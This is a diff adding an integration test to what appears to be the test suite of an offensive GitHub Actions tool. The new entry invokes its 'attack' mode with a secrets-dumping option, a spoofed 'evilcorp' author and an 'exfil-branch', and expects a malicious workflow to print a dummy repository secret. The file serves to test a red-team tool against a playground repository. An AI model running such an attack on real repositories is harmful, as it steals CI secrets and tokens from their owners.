@@ -358,5 +358,24 @@
             }
         ],
         "extra_validation": {"type":"none"}
+    },
+    {
+        "PAT": "ORG_ADMIN_REPO_WORKFLOW_TOKEN",
+        "invocation": "gato -s attack -t GHRunnerPlayground/TestWF --secrets --author-name Hackerman2 --author-email hacker2@evilcorp.com --message AllYourSecretBelongToUs --delete --timeout 60 -b exfil-branch",
+        "assertions": [
+            {
+                "expect": "The malicious workflow executed succesfully!",
+                "type": "stdout"
+            },
+            {
+                "expect": "The repository has 1 accessible secret(s)!",
+                "type": "stdout"
+            },
+            {
+                "expect": "DUMMY_TEST_SECRET=SUPER SECRET DUMMY VALUE",
+                "type": "stdout"
+            }
+        ],
+        "extra_validation": {"type":"none"}
     }
 ]
